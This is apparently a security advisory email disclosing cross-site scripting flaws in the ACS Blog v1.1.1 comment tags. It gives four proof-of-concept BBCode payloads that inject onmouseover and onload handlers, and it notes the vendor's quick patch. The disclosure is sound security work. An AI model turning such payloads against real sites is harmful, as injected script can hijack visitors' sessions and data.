Subject: Multiple XSS vulnerabilities in ACS Blog


These vulnerabilities have been tested on the latest version of ACS
Blog. (v1.1.1)

In the comments section of ACS Blog, it is possible to execute an XSS
attack through the [link], [mail], and [img] tags, due to lack of
filtering of single quotes and spaces inside the tags.

Examples/PoCs:

[link=http://www.google.com' onmouseover='alert("XSS vulnerability")'
o=']Don't you wanna see where this link goes?[/link]

[mail=bugtraq@...urityfocus.com' onmouseover='alert("XSS
vulnerability")' o=']Mr. Wiggles[/mail]

[img]http://www.example.com/image.jpg' onload='alert("XSS
vulnerability")' o='[/img]

[link=http://www.google.com target=_blank'
onmouseover=a=/Vulnerability/;alert(a.source) o=']Hooray[/link]

----------
Vendor responded within 2 hours of notification, notified users with
the security alert on its main page, and patched the vulnerabilities
within another couple of hours.

Cheers,
Dan
